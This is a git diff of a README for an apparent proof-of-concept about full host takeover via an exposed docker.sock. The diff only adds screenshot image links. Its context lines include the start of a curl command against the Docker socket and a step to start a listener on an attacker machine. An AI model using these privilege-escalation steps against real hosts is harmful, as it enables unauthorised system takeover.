@@ -1,5 +1,5 @@
 # Docker.sock-environment-takeover
-![](https://)
+![](https://github.com/Hritish42/docker.sock-environment-takeover/blob/main/Images/Docker.Socks.png?raw=true)
 
 /var/run/docker.sock could lead to full environment takeover. (Privilege Escalation)
 
@@ -22,8 +22,8 @@ curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containe
 - Start a listener on attacker machine on port 8888. 
 - Check the screenshots if you don't understand.
 
-![](https://)
-![](https://)
+![](https://github.com/Hritish42/docker.sock-environment-takeover/blob/main/Images/poc1.png?raw=true)
+![](https://github.com/Hritish42/docker.sock-environment-takeover/blob/main/Images/poc2.png?raw=true)
 
 
 ### References
